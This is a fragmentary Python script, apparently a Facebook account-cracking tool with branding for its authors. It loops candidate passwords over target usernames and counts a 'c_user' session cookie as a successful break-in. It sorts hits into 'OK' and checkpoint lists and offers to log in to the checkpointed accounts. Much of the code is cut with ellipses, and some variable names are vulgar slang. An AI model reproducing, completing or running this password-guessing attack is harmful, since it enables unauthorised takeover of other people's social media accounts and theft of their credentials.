# code by Yayan XD
# my facebook ( https://www.facebook.com/FOYSAL.OFFICIALS.ACCOUNT0075 )
...
__________________×_______________
  ...
  Other :https://www.facebook.com/MARK.SHOWROB
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By FOYSAL Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}FOYSAL123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[FOYSAL-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[FOYSAL-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SHOWROB]","\x1b[1;92m[SHOWROB]","\x1b[1;92m[FOYSAL]","\x1b[1;92m[FOYSAL]","\x1b[1;92m[FOYSAL]","\x1b[1;92m[SHOWROB]","\x1b[1;92m[SHOWROB]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[SHOWROB-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
